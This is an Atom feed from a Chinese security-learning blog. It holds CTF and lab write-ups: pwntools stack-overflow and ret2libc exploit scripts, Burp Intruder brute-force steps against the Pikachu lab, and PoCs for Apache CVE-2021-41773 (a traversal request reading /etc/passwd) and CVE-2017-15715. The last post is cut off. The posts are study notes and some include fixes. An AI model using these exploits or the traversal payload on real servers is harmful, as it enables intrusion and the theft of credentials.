<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sinky&#39;s Blog</title>
  
  
  <link href="https://sinky.top/atom.xml" rel="self"/>
  
  <link href="https://sinky.top/"/>
  <updated>2023-01-11T05:32:15.151Z</updated>
  <id>https://sinky.top/</id>
  
  <author>
    <name>Sinky</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>攻防世界-repeater</title>
    <link href="https://sinky.top/2023/01/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-repeater/"/>
    <id>https://sinky.top/2023/01/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-repeater/</id>
    <published>2023-01-11T02:36:01.322Z</published>
    <updated>2023-01-11T05:32:15.151Z</updated>
    
    <content type="html"><![CDATA[<h1 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h1><p><img src="https://s2.loli.net/2023/01/11/jMOrbuUX61ETSVP.png" alt="image.png"></p><p>64位文件；Full RELRO:got表不可写，无法被覆盖；没开栈保护；没开NX,可以执行内存；开了地址内存随机化；RWX:可读可写可执行</p><p>不知道，看一下ida</p><h1 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;checksec&quot;&gt;&lt;a href=&quot;#checksec&quot; class=&quot;headerlink&quot; title=&quot;checksec&quot;&gt;&lt;/a&gt;checksec&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2023/01/11/jMOrb</summary>
      
    
    
    
    
    <category term="PWN" scheme="https://sinky.top/tags/PWN/"/>
    
    <category term="CTF" scheme="https://sinky.top/tags/CTF/"/>
    
    <category term="攻防世界" scheme="https://sinky.top/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-pwnstack</title>
    <link href="https://sinky.top/2023/01/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-pwnstack/"/>
    <id>https://sinky.top/2023/01/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-pwnstack/</id>
    <published>2023-01-11T01:15:00.929Z</published>
    <updated>2023-01-11T05:32:15.148Z</updated>
    
    <content type="html"><![CDATA[<h1 id="check一下"><a href="#check一下" class="headerlink" title="check一下"></a>check一下</h1><p><img src="https://s2.loli.net/2023/01/11/y54WUZt8iVqElTz.png" alt="image.png"></p><p>64位文件；Partial RELRO:got表可写；没开栈保护；开了NX(堆栈不可执行)；没开地址随机化</p><p>可以考虑rop绕过</p><h1 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h1><pre><code class="hljs">__int64 vuln(){char buf[160]; // [rsp+0h] [rbp-A0h] BYREFmemset(buf, 0, sizeof(buf)); // 初始化buf为0read(0, buf, 0xB1uLL); // 输入数据给buf,大小为0xb1return 0LL;}</code></pre><p>buf位置：0xa0</p><p><img src="https://s2.loli.net/2023/01/11/HuUZndD5fgVSwti.png" alt="image.png"></p><p>后门函数：</p><p><img src="https://s2.loli.net/2023/01/11/bsM2VL8nrkJAWay.png" alt="image.png"></p><pre><code class="hljs">backdoor地址：0x400762</code></pre><p>思路：利用栈溢出漏洞，劫持程序，执行后门函数进行提权。</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><pre><code class="hljs">from pwn import *p= remote('61.147.171.105',49305)payload='a'*0xa0+'b'*8+p64(0x400762) # 填充0xa8大小的垃圾数据，覆盖返回地址执行后门函数p.sendline(payload)p.interactive()</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;check一下&quot;&gt;&lt;a href=&quot;#check一下&quot; class=&quot;headerlink&quot; title=&quot;check一下&quot;&gt;&lt;/a&gt;check一下&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2023/01/11/y54WUZt8i</summary>
      
    
    
    
    
    <category term="PWN" scheme="https://sinky.top/tags/PWN/"/>
    
    <category term="CTF" scheme="https://sinky.top/tags/CTF/"/>
    
    <category term="攻防世界" scheme="https://sinky.top/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
  </entry>
  
  <entry>
    <title>Pikachu-暴力破解</title>
    <link href="https://sinky.top/2023/01/10/Pikachu-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    <id>https://sinky.top/2023/01/10/Pikachu-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</id>
    <published>2023-01-10T06:40:29.819Z</published>
    <updated>2023-01-11T05:32:15.142Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>使用大量认证信息在认证接口进行尝试登录，直到得到正确结果，一般会使用带有字典的工具进行自动化操作。</p><p>认证安全策略：</p><ol><li>是否要求用户设置复杂的密码</li><li>是否每次认证都使用安全的验证码或手机otp</li><li>是否对尝试登录的行为进行判断和限制</li><li>是否采用了双因素认证</li></ol><p>等等。</p><h1 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h1><p>无验证码干扰，可以直接使用常用名撞库用户和密码：</p><p>随意输入用户名密码，bp抓包，将数据包发送至Intruder(测试器)</p><p>打开位置，选择集束炸弹为攻击类型，将用户名和密码设置为撞库的变量</p><p><img src="https://s2.loli.net/2023/01/10/pLkhFYa5gNzR9IV.png" alt="image.png"></p><p>打开有效载荷，如图设置有效负载集1，添加用户名列表（随便输入常用用户名）：</p><p><img src="https://s2.loli.net/2023/01/10/yMEucQ2VdOx8HFG.png" alt="image.png"></p><p>切换有效负载集为2，如图添加常用密码列表：</p><p><img src="https://s2.loli.net/2023/01/10/F7UmLvdDWlIH8cq.png" alt="image.png"></p><p>开始攻击</p><p><img src="https://s2.loli.net/2023/01/10/741KfjTqZbowcAO.png" alt="image.png"></p><p>只有admin/123456组合的响应串长度不同，说明它是正确的。</p><h2 id="拓展：攻击类型"><a href="#拓展：攻击类型" class="headerlink" title="拓展：攻击类型"></a>拓展：攻击类型</h2><ul><li>狙击手(Sniper): 一次只使用一个payload位置</li><li>攻城锤(Battering ram): 一个payload替换所有标记位置</li><li>音叉(Pitchfork): 多组payload组合</li><li>集束炸弹(Cluster bomb): 多组payload笛卡尔积组合</li></ul><h1 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h1><p>随意输入用户名和密码，输入正确验证码，bp抓包，发送到重发器分析。</p><p>当修改用户名为其他字符时，回显依旧是<code>username or password is not exists～</code>，而不是验证码错误，说明验证码没有刷新，可以一直使用，</p><p><img src="https://s2.loli.net/2023/01/10/7DMVzitfUIGaypJ.png" alt="image.png"></p><p>按照上文，选择用户名和密码为变量，进行撞库攻击，获取正确的账户密码。</p><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>提交的验证码会被与存储在服务器session中的验证码做验证，但由于在验证完成之后，没有及时销毁session，使用过的session值仍然可以重复使用。</p><h1 id="验证码绕过-on-client"><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过(on client)"></a>验证码绕过(on client)</h1><p>验证码是js随机生成，只在前端处理，没有传值给后端。</p><p><img src="https://s2.loli.net/2023/01/10/cClQVaUKkA4xPn2.png" alt="image.png"></p><p>步骤如验证码绕过(on server)</p><h1 id="token防爆破？"><a href="#token防爆破？" class="headerlink" title="token防爆破？"></a>token防爆破？</h1><p>客户端token跟随用户名和密码一起提交给服务器并且与服务器端token值进行对比，那么也就意味着每次客户端请求服务器都会进行token值校验是否正确。</p><p>每次请求前需要把上一次请求的响应包获取，将token值截取，实现绕过。</p><p>随意输入用户名密码，bp抓包，发送到测试器。</p><p>选择音叉(Pitchfork)攻击。</p><p>修改用户名为admin,选择passwd和token为变量。</p><p><img src="https://s2.loli.net/2023/01/10/BqG5USE3rX1L9Hh.png" alt="image.png"></p><p>打开选项，找到grep-extract功能，勾选“从响应中提取以下项目”，点击添加</p><p><img src="https://s2.loli.net/2023/01/10/i2c6T5VJaYbCqGd.png" alt="image.png"></p><p>如图填写，获得回复，复制token值。</p><p>找到重定向，改为<code>总是</code></p><p>找到请求引擎，改线程数为1</p><p>回到有效载荷页面：</p><p><img src="https://s2.loli.net/2023/01/10/YyDKFziaLZs8eAG.png" alt="image.png"></p><p>在有效负载集2中，选择递归搜索，添加token值：</p><p><img src="https://s2.loli.net/2023/01/10/P2f4DE7xLNalIcr.png" alt="image.png"></p><p>开始攻击</p><p><img src="https://s2.loli.net/2023/01/10/KzChpti9kj3AMm2.png" alt="image.png"></p><p>得到用户名密码。</p><h2 id="拓展：Token"><a href="#拓展：Token" class="headerlink" title="拓展：Token"></a>拓展：Token</h2><p>token在计算机身份认证中是令牌(临时)的意思，一般在网站上用于身份验证，流程如下：</p><ol><li>客户端使用用户名密码请求登录</li><li>服务端收到请求，去验证用户名密码</li><li>验证成功后，服务端签发一个token，并将其发送给客户端</li><li>客户端收到后将token存储起来</li><li>客户端每次向服务端请求资源的时候需要带着服务端签发的token</li><li>服务端收到请求，去验证客户端请求里面带着的token，验证成功后向客户端返回请求的数据</li><li>app登录时发送加密的用户名密码到服务器，服务器验证用户名密码，成功后以某种方式作为token存储到服务器中，并返回token到app，以后app请求时，凡需要验证的地方都要带上该token。后服务器端验证token，成功返回所需要的结果，失败返回错误信息，让他重新登录。其中服务器上token设置一个有效期，每次APP请求的时候都验证token和有效期。</li></ol><p><a href="https://www.cnblogs.com/WangwangDui652/p/16498186.html">https://www.cnblogs.com/WangwangDui652/p/16498186.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;使用大量认证信息在认证接口进行尝试登录，直到得到正确结果，一般会使用带有字典的工具进行自动化操作。&lt;/p&gt;
&lt;p&gt;认证安全策略：&lt;/p&gt;
&lt;</summary>
      
    
    
    
    
    <category term="Pikachu" scheme="https://sinky.top/tags/Pikachu/"/>
    
    <category term="靶场" scheme="https://sinky.top/tags/%E9%9D%B6%E5%9C%BA/"/>
    
    <category term="暴力破解" scheme="https://sinky.top/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>vulhub之CVE-2021-41773</title>
    <link href="https://sinky.top/2023/01/09/vulhub%E4%B9%8BCVE-2021-41773/"/>
    <id>https://sinky.top/2023/01/09/vulhub%E4%B9%8BCVE-2021-41773/</id>
    <published>2023-01-09T08:49:36.419Z</published>
    <updated>2023-01-11T05:32:15.146Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h1><p>Apache HTTP Server 2.4.49上引入的漏洞，该漏洞允许攻击者绕过路径遍历保护，使用编码并读取网络服务器文件系统上的任意文件。</p><p>apache-CVE-2021-41773漏洞利用的用户身份为<code>httpd.conf</code>中指定的用户，可以执行该用户对应身份权限的读写。</p><p>原理：</p><p>使用<code>ap_normalize_path</code>函数在对路径参数进行规范化时会先进行url解码，然后判断是否存在<code>../</code>的路径穿越符。</p><p>当检测到路径中存在<code>%</code>字符时，如果紧跟的2个字符是十六进制字符，就会进行url解码，将其转换成标准字符，如<code>%2e</code>通过url解码之后是一个点(.)对于路径的url解码之后再来判断是否存在<code>../</code></p><p>如果路径中存在<code>%2e./</code>形式，就会检测到，因为遍历第一个字符是<code>%</code>紧跟2个字符是十六进制那么会被转换成点，这样会和后面的<code>./</code>就会连成<code>../</code>这样就会被拦截，但是出现<code>.%2e/</code>这种形式时，在遍历到第一个<code>.</code>字符时，此时检测到后面的两个字符是<code>%2</code>，那么就构造不成../而是.%2，就不会把它当作路径穿越符处理，也就是说在检测是否有路径穿越符之后，%2e再解码变成了点，最终.%2e/解码成了../。因此可以使用.%2e/或者%2e%2e绕过对路径穿越符的检测。</p><p>(什么鬼，不太明白)</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p><img src="https://s2.loli.net/2023/01/10/HpYVbL5JqxchAtF.png" alt="image.png"></p><p>poc:</p><pre><code class="hljs">GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</code></pre><h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>增加ap_normalize_path函数的判断条件，对于.%2e或者%2e%2e进行判断，避免绕过</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞详情&quot;&gt;&lt;a href=&quot;#漏洞详情&quot; class=&quot;headerlink&quot; title=&quot;漏洞详情&quot;&gt;&lt;/a&gt;漏洞详情&lt;/h1&gt;&lt;p&gt;Apache HTTP Server 2.4.49上引入的漏洞，该漏洞允许攻击者绕过路径遍历保护，使用编码并读取网络服务器文</summary>
      
    
    
    
    
    <category term="vulhub" scheme="https://sinky.top/tags/vulhub/"/>
    
    <category term="靶场" scheme="https://sinky.top/tags/%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulhub:CVE-2017-15715</title>
    <link href="https://sinky.top/2023/01/06/vulhub%EF%BC%9ACVE-2017-15715/"/>
    <id>https://sinky.top/2023/01/06/vulhub%EF%BC%9ACVE-2017-15715/</id>
    <published>2023-01-06T06:02:48.734Z</published>
    <updated>2023-01-09T01:21:23.184Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>Apache HTTPD换行解析漏洞。</p><p>Apache在2.4.0-2.4.29版本中存在一个解析漏洞，程序在解析php时，若文件名最后有一个换行符<code>x0A</code>,apache依然会将其当成php解析，但是在上传文件时可以成功绕过黑名单。</p><p>如果上传文件的php程序是设置的白名单，那么这个漏洞将无法利用。</p><h1 id="漏洞利用实操"><a href="#漏洞利用实操" class="headerlink" title="漏洞利用实操"></a>漏洞利用实操</h1><p>构造文件1.php</p><p>内容：</p><pre><code class="hljs">&lt;?php    phpinfo();?&gt;</code></pre><p>上传：</p><p><img src="https://s2.loli.net/2023/01/06/qDdvEzKGwoeUHh7.png" alt="image.png"></p><p>返回<code>bad file</code></p><p>打开bp抓包，把包发送到重发器</p><p>切换Hex，找到1.php</p><p><img src="https://s2.loli.net/2023/01/06/gnXfeHpDcdyjhR5.png" alt="image.png"></p><p>在70后添加个<code>0a</code>,然后点击发送，此时回显已经没有<code>bad file</code>了</p><p><img src="https://s2.loli.net/2023/01/06/bYJRr47gGAdh5pl.png" alt="image.png"></p><p>访问<code>http://ip:8080/1.php%0a</code></p><p>成功看到phpinfo信息，说明apache解析了<code>1.php%0a</code></p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>apache配置文件中，将以<code>.php</code>结尾的文件都进行解析，但<code>$</code>符号会匹配换行符</p><p><img src="https://s2.loli.net/2023/01/06/xW9NL6Y5TjVna1E.png" alt="image.png"></p><p>即<code>.php</code>加上换行符就能被解析成php文件</p><blockquote><p>0x0a是换行符的ascii码，换行符是控制字符，所以修改数据包的十六进制来达到插入换行符的目的</p></blockquote><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><ol><li>对中间件进行升级</li><li>对上传文件重命名</li><li>上传时采用白名单的验证方式</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h1&gt;&lt;p&gt;Apache HTTPD换行解析漏洞。&lt;/p&gt;
&lt;p&gt;Apache在2.4.0-2.4.29版本中存在一个解析漏洞，程序在解</summary>
      
    
    
    
    
    <category term="vulhub" scheme="https://sinky.top/tags/vulhub/"/>
    
    <category term="靶场" scheme="https://sinky.top/tags/%E9%9D%B6%E5%9C%BA/"/>
    
    <category term="换行解析漏洞" scheme="https://sinky.top/tags/%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界CTF-Misc2</title>
    <link href="https://sinky.top/2023/01/04/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCTF-Misc2/"/>
    <id>https://sinky.top/2023/01/04/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCTF-Misc2/</id>
    <published>2023-01-04T06:45:17.135Z</published>
    <updated>2023-01-09T01:21:23.192Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Misc1"><a href="#Misc1" class="headerlink" title="Misc1"></a>Misc1</h1><p>题目：<code>d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9e1e6b3e3b9e4b3b7b7e2b6b1e4b2b6b9e2b1b1b3b3b7e6b3b3b0e3b9b3b5e6fd</code></p><p>以为是十六进制转文本，失败</p><p>看一下组成：数字+字母a-f</p><p>转ascii乱码，应该偏移了，一般是偏移128</p><pre><code class="hljs">s = 'd4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9e1e6b3e3b9e4b3b7b7e2b6b1e4b2b6b9e2b1b1b3b3b7e6b3b3b0e3b9b3b5e6fd'hex_new = ''for i in range(0,len(s),2):    hex_ = s[i:i+2]    d_ = int('0x'+ hex_, 16)    d_surplus = d_%128    temp = hex(d_surplus)[2:4]    hex_new+=tempprint(str(hex_new))</code></pre><p>结果转字符串得到flag:</p><pre><code class="hljs"> DDCTF{9af3c9d377b61d269b11337f330c935f}</code></pre><h1 id="Encode"><a href="#Encode" class="headerlink" title="Encode"></a>Encode</h1><p>密文：</p><pre><code class="hljs">4O595954494Q32515046324757595N534R52415653334357474R4N575955544R4O5N4Q46434S4O59474253464Q5N444R4Q51334557524O5N4S424944473542554O595N44534O324R49565746515532464O49345649564O464R4R494543504N35</code></pre><p>rot13解密：</p><pre><code class="hljs">4B595954494D32515046324757595A534E52415653334357474E4A575955544E4B5A4D46434F4B59474253464D5A444E4D51334557524B5A4F424944473542554B595A44534B324E49565746515532464B49345649564B464E4E494543504A35</code></pre><p>base16解密：</p><pre><code class="hljs">KYYTIM2QPF2GWYZSNRAVS3CWGNJWYUTNKZMFCOKYGBSFMZDNMQ3EWRKZOBIDG5BUKYZDSK2NIVWFQU2FKI4VIVKFNNIECPJ5</code></pre><p>base32解密：</p><pre><code class="hljs">V143Pytkc2lAYlV3SlRmVXQ9X0dVdmd6KEYpP3t4V29+MElXSER9TUEkPA==</code></pre><p>base64解密：</p><pre><code class="hljs">W^7?+dsi@bUwJTfUt=_GUvgz(F)?{xWo~0IWHD}MA$&lt;</code></pre><p>看起来乱七八糟的，看wp，得知是base85解密：</p><p>没找到能解密的网站，找到了脚本解密一下：</p><pre><code class="hljs">import base64a = "W^7?+dsi@bUwJTfUt=_GUvgz(F)?{xWo~0IWHD}MA$&lt;"b = base64.b85decode(a)print(b)</code></pre><p>flag:</p><pre><code class="hljs">flag{W0w_y0u_c4n_rea11y_enc0d1ng!}</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Misc1&quot;&gt;&lt;a href=&quot;#Misc1&quot; class=&quot;headerlink&quot; title=&quot;Misc1&quot;&gt;&lt;/a&gt;Misc1&lt;/h1&gt;&lt;p&gt;题目：&lt;code&gt;d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://sinky.top/tags/CTF/"/>
    
    <category term="攻防世界" scheme="https://sinky.top/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    <category term="Misc" scheme="https://sinky.top/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>基本ROP之ret2libc</title>
    <link href="https://sinky.top/2022/12/09/%E5%9F%BA%E6%9C%ACROP%E4%B9%8Bret2libc/"/>
    <id>https://sinky.top/2022/12/09/%E5%9F%BA%E6%9C%ACROP%E4%B9%8Bret2libc/</id>
    <published>2022-12-09T05:23:07.171Z</published>
    <updated>2023-01-10T06:38:33.644Z</updated>
    
    <content type="html"><![CDATA[<p>程序下载：<a href="https://pan.baidu.com/s/1rrz6u-w_TlmQcdQrU_rZlw">https://pan.baidu.com/s/1rrz6u-w_TlmQcdQrU_rZlw </a><br>提取码：rc47</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>ret2libc 即控制函数执行libc中的函数，通常是返回至某个函数的plt处或者函数的具体位置(即函数对应的got表项的内容)。通常情况下，会选择执行<code>system('/bin/sh')</code>，所以需要先直到system函数的地址。</p><p>忘了plt啥是啥了，回忆一下：</p><h2 id="Got-Plt表"><a href="#Got-Plt表" class="headerlink" title="Got,Plt表"></a>Got,Plt表</h2><ul><li>got: 全局偏移表，用于存储外部函数在内存的确切地址，got表存储在数据段内，可以在程序运行中被修改。</li><li>plt: 程序链接表，用于存储外部函数的入口点，即程序总会到plt寻找外部函数的地址，plt存储在代码段内，在运行之前就已经确定并且不会被修改，所以plt不会知道程序运行时动态链接库被加载的确切位置。</li><li>plt表内存储的入口点就是got表中对应条目的地址</li><li>got表初始值都指向plt表对应条目中的某个片段，该片段的作用是调用一个函数地址解析函数，如果是第一次调用这个函数，程序会通过got表再次跳转回plt表，运行地址解析程序来确定函数的确切地址，并用其覆盖掉got表初始值，之后再执行函数调用。当再次调用这个函数，程序仍然首先通过plt表跳转到got表，此时got表已经存有获取函数的内存地址，所以会直接跳转到函数所在地址执行函数</li></ul><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><ol><li>当程序中没有<code>/bin/sh</code>时,可以利用程序中某些函数如:<code>read``fgets``gets</code>等函数将<code>/bin/sh</code>写入bss段或某个变量中,找到其地址.</li><li>对于只给了libc.so文件的程序,可以直接在libc.so文件中去找system()函数和<code>/bin/sh</code></li><li>没有给libc.so的程序,可以通过泄露程序中某个函数的地址,通过查询来找出其使用libc.so版本</li></ol><h1 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h1><p>checksec查看：</p><p><img src="https://s2.loli.net/2022/12/09/6H4z2hNIy5mSOrQ.png" alt="image.png"></p><p>32位，got表可写，没开栈保护和地址随机，开启了NX(不可执行)</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>IDA分析：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">setvbuf</span>(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"RET2LIBC &gt;_&lt;"</span>);<br>  <span class="hljs-built_in">gets</span>(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>gets()函数，存在栈溢出漏洞。</p><p>查看字符串：</p><pre><code class="hljs">`/bin/sh`：0x08048720system: 0x08048460</code></pre><p>算偏移量，然后溢出到后门函数，就ok啦</p><p>看一下call gets()的地址：</p><p><img src="https://s2.loli.net/2022/12/09/6yR149KtDrTj8fx.png" alt="image.png"></p><p>gdb中下断点运行：</p><pre><code class="hljs">b *0x0804867E</code></pre><p><img src="https://s2.loli.net/2022/12/09/E4a2SyeiWoKLJcB.png" alt="image.png"></p><p>偏移量不对，看了一下wp</p><pre><code class="hljs">char s[100]; // [esp+1Ch] [ebp-64h] BYREF</code></pre><p>system在.plt段，调用plt中函数时需要在栈中部署两个参数，第一个是system执行后的返回地址，第二个是system函数中的参数。</p><p><img src="https://s2.loli.net/2022/12/12/mzOZa1Ipe7MLSXW.png" alt="image.png"></p><p>栈构造如图，s变量距离esp指针0x1Ch,距离ebp指针0x64h,所以偏移量为<code>ebp-(esp+1C)+4=112</code></p><p>还是不太理解，一般eax是存储返回地址的，所以偏移量就是<code>ebp-eax+4=112</code></p><p><img src="https://s2.loli.net/2022/12/12/7x6h2lSs5EoIvpr.png" alt="image.png"></p><p>我看pwndbg可以直接得到偏移量，但是这边网络不能访问Github,等回家吧。</p><p><img src="https://s2.loli.net/2022/12/12/kjANIc2O3qZJM7e.png" alt="image.png"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre><code class="hljs">from&nbsp;pwn&nbsp;import&nbsp;*p&nbsp;=&nbsp;process("./ret2libc1")system_plt&nbsp;=&nbsp;0x08048460bin_sh&nbsp;=&nbsp;0x08048720payload&nbsp;=&nbsp;flat(['a'*112,system_plt,'b'*4,bin_sh])p.sendline(payload)p.interactive()</code></pre><p><img src="https://s2.loli.net/2022/12/12/p4sCBbRmZf6TcAQ.png" alt="image.png"></p><h1 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h1><p><img src="https://s2.loli.net/2022/12/12/kJrzahF3b8gH4iU.png" alt="image.png"></p><p>32位，got表可写，开NX.</p><p>IDA分析：</p><p>main函数：</p><pre><code class="hljs">int __cdecl main(int argc, const char **argv, const char **envp){    char s[100]; // [esp+1Ch] [ebp-64h] BYREF    setvbuf(stdout, 0, 2, 0);    puts("Something surprise here, but I don't think it will work.");    printf("What do you think ?");    gets(s);    return 0;}</code></pre><p>有system</p><p>无<code>/bin/sh</code></p><p>需要自己来读取字符串，不会，看一看wp.</p><blockquote><p>思路：用gets输入system()的参数<code>/bin.sh</code></p></blockquote><p><img src="https://s2.loli.net/2022/12/12/l7aHPDZVyrvf148.png" alt="image.png"></p><pre><code class="hljs">gets_plt=0x08048460system_plt=0x08048490</code></pre><p>去bss段瞅瞅能用的变量：</p><p><img src="https://s2.loli.net/2022/12/12/IgaFqz2HrBwl1uh.png" alt="image.png"></p><p>看到了一个小可爱<code>buf2 (0x0804A080)</code></p><p>用gadget找ret语句：</p><pre><code class="hljs">ROPgadget --binary ret2libc2 --only 'pop|ret'</code></pre><p><img src="https://s2.loli.net/2022/12/12/7CTqJBtcA2Ov6aF.png" alt="image.png"></p><p>选择:</p><pre><code class="hljs">0x0804843d : pop ebx ; ret</code></pre><p>因为其他的只有<code>pop ebx</code>，没有<code>pop eax</code></p><p>算一下偏移吧，做到这里我甚至不知道自己干啥呢……没咋明白。</p><p>在gets()处断点：</p><pre><code class="hljs">b *0x080486BA</code></pre><p>运行：</p><p><img src="https://s2.loli.net/2022/12/12/9ptqKDe4fdr6bWi.png" alt="image.png"></p><pre><code class="hljs">EAX: 0xffffd49cEBP: 0xffffd508ESP: 0xffffd480</code></pre><p>跟ret2libc1一样，偏移就是112（用pwndbg爆出来也行<code>cyclic -l </code>）</p><p>栈结构一般是：</p><p><img src="https://s2.loli.net/2022/12/12/GHh9JYdNcVAWolx.png" alt="image.png"></p><p>本题栈结构：</p><p><img src="https://s2.loli.net/2022/12/12/n4vCXK6zgs2TGON.png" alt="image.png"></p><pre><code class="hljs">payload=flat(['a'*112,gets_plt,system_plt,buf2,buf2,'/bin/sh'])</code></pre><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><pre><code class="hljs">from pwn import *p=process('./ret2libc2')system_plt=0x08048490gets_plt=0x08048460buf2=0x0804A080payload=flat(['a'*112,gets_plt,system_plt,buf2,buf2,'/bin/sh'])p.sendline(payload)p.interactive()</code></pre><p><img src="https://s2.loli.net/2022/12/12/rU2kWYJIMHNz9Bw.png" alt="image.png"></p><p>成功！！！！</p><p>虽然不大明白，但是大概明白……</p><h1 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h1><p>隔了一个月才做这个例子……前面的简单复习了一遍，怎么感觉阳完之后脑袋空空</p><p>checksec检查：</p><p><img src="https://s2.loli.net/2023/01/09/hduM6E7Fl8Hkmw1.png" alt="image.png"></p><p>32位文件，没开栈保护，没有地址随机化，开了NX(堆栈不可执行)</p><p>ida分析：</p><p>main()函数：</p><p><img src="https://s2.loli.net/2023/01/09/7O8p3RI6bkPKXeL.png" alt="image.png"></p><p>gets() 存在栈溢出</p><p>查了一下，没有后门函数，也没有字符串<code>/bin/sh</code></p><h2 id="目的："><a href="#目的：" class="headerlink" 